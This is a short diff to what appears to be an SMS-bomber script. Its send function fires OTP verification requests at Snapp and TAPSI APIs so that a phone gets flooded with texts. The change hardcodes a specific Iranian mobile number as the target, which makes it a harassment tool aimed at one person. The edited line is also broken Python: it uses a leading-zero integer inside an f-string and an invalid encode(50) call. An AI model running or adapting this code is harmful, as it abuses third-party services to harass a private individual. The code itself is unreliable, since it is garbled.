@@ -11,7 +11,7 @@ def send(cellphone):
     #1. Snapp [OK]
     http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
         headers={"Content-Type": "application/json"},
-        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
+        body=dumps({"cellphone": f"+98{09182714883}"}).encode(50))
 
     #2. TAPSI [OK]
     http.request("post", "https://tap33.me/api/v2/user",
